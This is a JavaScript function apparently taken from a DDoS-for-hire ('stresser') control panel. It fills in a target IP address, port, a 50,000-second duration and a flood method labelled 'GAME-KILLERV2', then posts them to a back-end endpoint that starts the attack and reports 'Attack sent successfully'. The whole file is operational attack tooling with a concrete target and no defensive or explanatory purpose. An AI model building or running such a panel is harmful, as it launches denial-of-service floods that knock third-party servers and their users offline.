function attack() {
  var host = $("#host").val("128.116.76.36");
  var time = $("#time").val("50000");
  var data = $("#method").val("GAME-KILLERV2");
  var port = $("#port").val("62851");
  document.getElementById("attackalert").style.display = "none";
  document.getElementById("attackloaderr").style.display = "inline";
  document.getElementById("hit").style.display = "none";
  var xmlhttp;
  if (window.XMLHttpRequest) {
    xmlhttp = new XMLHttpRequest();
  } else {
    xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
  }
  xmlhttp.onreadystatechange = function() {
    if (xmlhttp.readyState == 4 && xmlhttp.status == 200) {
      document.getElementById("attackalert").innerHTML = xmlhttp.responseText;
      document.getElementById("hit").style.display = "inline";
      document.getElementById("attackloaderr").style.display = "none";
      document.getElementById("attackalert").style.display = "inline";
      if (xmlhttp.responseText.search("Attack sent successfully") != -1) {
        window.location.reload();
      }
    }
  };
  xmlhttp.open("POST", "ajax/hub.php?type=start", true);
  xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
  xmlhttp.send("host=" + host + "&time=" + time + "&port=" + port + "&method=" + data);
}
